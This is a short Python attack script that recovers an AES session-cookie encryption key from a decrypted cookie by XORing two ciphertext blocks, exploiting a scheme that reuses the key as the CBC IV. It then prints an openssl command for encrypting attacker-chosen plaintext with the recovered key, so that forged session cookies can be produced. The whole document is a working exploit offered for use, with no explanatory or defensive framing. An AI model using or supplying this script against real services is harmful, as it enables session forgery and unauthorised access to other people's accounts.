#!/usr/bin/python3

import sys, base64, numpy


if len(sys.argv) < 2:
  print('usage: ' + sys.argv[0] + ' <decrypted>')
  sys.exit()

decrypted = base64.b64decode(sys.argv[1])

block1 = bytearray(decrypted)[:16]
block3 = bytearray(decrypted)[-16:]

# no real cryptography, just XOR :)
key = bytes(numpy.bitwise_xor(block1, block3))

keyhex = key.hex()
print('\nRetrieved session cookie encryption key: %s' % keyhex)

print('\nNow try this:')
print('echo -n <plaintext> | openssl enc -aes-128-cbc -in - -iv %s -K %s | base64 -w 0' % (keyhex, keyhex))
